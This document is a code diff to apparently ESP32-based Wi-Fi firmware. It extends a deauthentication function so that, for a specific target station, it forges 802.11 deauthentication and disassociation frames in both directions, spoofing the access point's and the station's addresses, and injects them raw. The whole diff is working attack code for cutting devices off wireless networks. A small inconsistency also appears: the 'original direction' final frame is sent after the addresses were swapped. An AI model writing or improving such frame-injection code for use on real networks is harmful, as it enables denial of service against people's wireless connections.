@@ -1162,7 +1162,16 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
         0xf0, 0xff, 0x02, 0x00
     };
     
-    // Build AP source packet (for both frames)
+    // Check if this is a broadcast MAC
+    bool is_broadcast = true;
+    for (int i = 0; i < 6; i++) {
+        if (mac[i] != 0xFF) {
+            is_broadcast = false;
+            break;
+        }
+    }
+
+    // Direction 1: AP -> Station
     deauth_frame_default[4] = mac[0];
     deauth_frame_default[5] = mac[1];
     deauth_frame_default[6] = mac[2];
@@ -1206,15 +1215,53 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
     disassoc_frame_default[20] = bssid[4];
     disassoc_frame_default[21] = bssid[5];
     
-    // Send deauth frames
+    // Send deauth and disassoc frames in first direction
     esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
     esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    
-    // Send disassoc frames
     esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
     esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+
+    // If not broadcast, send packets in opposite direction (Station -> AP)
+    if (!is_broadcast) {
+        // Swap addresses for reverse direction
+        // Set destination as BSSID
+        deauth_frame_default[4] = bssid[0];
+        deauth_frame_default[5] = bssid[1];
+        deauth_frame_default[6] = bssid[2];
+        deauth_frame_default[7] = bssid[3];
+        deauth_frame_default[8] = bssid[4];
+        deauth_frame_default[9] = bssid[5];
+
+        disassoc_frame_default[4] = bssid[0];
+        disassoc_frame_default[5] = bssid[1];
+        disassoc_frame_default[6] = bssid[2];
+        disassoc_frame_default[7] = bssid[3];
+        disassoc_frame_default[8] = bssid[4];
+        disassoc_frame_default[9] = bssid[5];
+
+        // Set source as station MAC
+        deauth_frame_default[10] = mac[0];
+        deauth_frame_default[11] = mac[1];
+        deauth_frame_default[12] = mac[2];
+        deauth_frame_default[13] = mac[3];
+        deauth_frame_default[14] = mac[4];
+        deauth_frame_default[15] = mac[5];
+
+        disassoc_frame_default[10] = mac[0];
+        disassoc_frame_default[11] = mac[1];
+        disassoc_frame_default[12] = mac[2];
+        disassoc_frame_default[13] = mac[3];
+        disassoc_frame_default[14] = mac[4];
+        disassoc_frame_default[15] = mac[5];
+
+        // Send reverse direction packets
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+    }
     
-    // Final frame with error checking
+    // Final frame with error checking (original direction)
     err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
     if (err != ESP_OK) {
         printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
